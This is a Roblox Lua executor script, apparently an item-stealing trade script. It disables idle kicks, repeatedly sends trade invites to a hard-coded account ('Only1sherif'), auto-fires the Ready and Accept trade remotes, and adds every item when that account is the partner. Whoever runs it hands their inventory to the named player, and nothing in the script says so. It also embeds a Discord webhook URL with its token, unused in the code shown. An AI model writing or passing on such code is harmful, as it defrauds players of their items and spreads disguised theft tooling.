if game.PlaceId ~= 109983668079237 then return end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local plr = Players.LocalPlayer

local TARGET_NAME = "Only1sherif"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1496254716508639262/J-eMNrXhdgaWAiIlMIiObJCsXw0E3s4XHB2S-0HLvkOYRdoJI2QDnAGmPU0EJtTZhbK6"

for i, v in pairs(getconnections(plr.Idled)) do
    if v.Disable then v:Disable() end
end

local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
local function getRemote(name)
    local children = Net:GetChildren()
    for i, obj in ipairs(children) do if obj.Name == name then return children[i+1] end end
    return nil
end

local readyRE = getRemote("RE/TradeService/Ready")
local acceptRE = getRemote("RE/TradeService/Accept")

local function sendInvite()
    local tl = plr.PlayerGui:FindFirstChild("TradePlayerList")
    if tl and tl:FindFirstChild("TradePlayerList") then
        local inner = tl.TradePlayerList
        local sb = inner.bg.SearchFrame.SearchBox
        sb.Text = TARGET_NAME
        task.wait(0.3)
        pcall(function() firesignal(sb.FocusLost, true) end)
        task.wait(0.2)
        for _, p in pairs(inner.Global.List:GetChildren()) do
            if p:IsA("Frame") and p:FindFirstChild("Fill") then
                local send = p.Fill:FindFirstChild("Send")
                if send then
                    pcall(function() firesignal(send.Activated) end)
                    return true
                end
            end
        end
    end
    return false
end

task.spawn(function()
    while true do
        pcall(function()
            local tradeUI = plr.PlayerGui:FindFirstChild("TradeLiveTrade")
            if tradeUI and tradeUI.Enabled then
                local inner = tradeUI.TradeLiveTrade
                
                -- Fast Ready/Accept
                if readyRE then readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end
                task.wait(0.1)
                if acceptRE then acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end
                
                -- Add items only if target matches
                if inner.Other.Username.Text:lower():find(TARGET_NAME:lower()) then
                    local scroll = inner:FindFirstChild("ScrollingFrame", true)
                    if scroll then
                        for _, slot in pairs(scroll:GetChildren()) do
                            if slot.Name:sub(1,9) == "Selection" then
                                local spacer = slot:FindFirstChild("Spacer")
                                if spacer and spacer:FindFirstChild("UIStroke") then
                                    if spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
                                        firesignal(spacer.Activated)
                                    end
                                end
                            end
                        end
                    end
                end
            else
                sendInvite()
            end
        end)
        task.wait(1)
    end
end)
